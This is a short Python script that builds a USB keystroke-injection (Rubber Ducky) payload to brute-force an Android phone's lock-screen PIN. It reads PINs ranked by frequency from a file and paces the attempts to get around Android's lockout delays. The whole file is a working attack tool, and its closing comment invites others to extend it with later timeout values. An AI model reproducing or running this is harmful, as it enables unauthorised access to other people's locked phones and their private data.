
myfile = open('pin.txt','rt') #opens the text file in which all the pins are written
pins=[]
for line in myfile:           #creates the list of all those pins without their frequencies
    pin,sep,freq =line.partition(',')
    pins.append(pin+'\n')
myfile.close()

script_file=open('payload.txt','w')  #cretes a new file to write ducky script
script_file.write('DEFAULT_DELAY 40\nDELAY 1000\nENTER\nSPACE\nSPACE\n') #wakes up android phone

for x in range(5): #tries first 5 pins
    script_file.write('STRING '+pins[x]+'ENTER\n'+ 'ENTER\n')
script_file.write('DELAY 30000\nENTER\nSPACE\n') #delay for 30 seconds
for x in range(5,10): #tries next 5 pins
    script_file.write('STRING '+pins[x]+'ENTER\n'+ 'ENTER\n')
for x in range(10,40): #after 30 secs delay tries next 30 pins, each pin after 30 secs
    script_file.write('DELAY 30000\nENTER\nSPACE\n'+'STRING '+pins[x]+'ENTER\n'+ 'ENTER\n')
for x in range(40,50): #after 60 secs delay tries next 10 pins, each pin after 60 secs
    script_file.write('DELAY 60000\nENTER\nSPACE\n'+'STRING '+pins[x]+'ENTER\n'+ 'ENTER\n')
for x in range(50,len(pins)): 
    # after 2mins tries all the remaining pins with 2mins delay after every attempt
    script_file.write('DELAY 120000\nENTER\nSPACE\n'+'STRING '+pins[x]+'ENTER\n'+ 'ENTER\n')

    """ I know that further android will increase the timeout after few more attempts
    But I can't find on internet that after how many attempts it is increased and
    I'm too lazy to wait for it and then find it so if you guys know the further timeouts then
    make sure to update that in this script :) """
